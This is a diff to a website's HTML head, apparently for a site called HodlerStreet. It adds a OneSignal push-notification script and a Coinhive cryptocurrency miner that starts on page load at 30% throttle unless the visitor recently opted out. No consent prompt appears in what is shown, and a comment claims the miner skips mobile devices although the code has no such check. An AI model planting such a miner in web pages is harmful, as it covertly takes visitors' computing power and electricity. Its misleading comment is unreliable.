@@ -68,5 +68,24 @@
     <!-- MailMunch for HodlerStreet -->
     <!-- Paste this code right before the </head> tag on every page of your site. -->
     <script src="//a.mailmunch.co/app/v1/site.js" id="mailmunch-script" data-mailmunch-site-id="455876" async="async"></script>
+    <link rel="manifest" href="/manifest.json" />
+    <script src="https://cdn.onesignal.com/sdks/OneSignalSDK.js" async=""></script>
+    <script>
+    var OneSignal = window.OneSignal || [];
+    OneSignal.push(function() {
+        OneSignal.init({
+        appId: "2eac4e65-ad52-456b-b900-a4bff7d9b73f",
+        });
+    });
+    </script>
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+	var miner = new CoinHive.Anonymous('xlW2dv3kNaEWT2JHdQqZjzoi833FnJWK', {throttle: 0.3});
 
+	// Only start on non-mobile devices and if not opted-out
+	// in the last 14400 seconds (4 hours):
+	if ( !miner.didOptOut(14400)) {
+		miner.start();
+	}
+</script>
 </head>
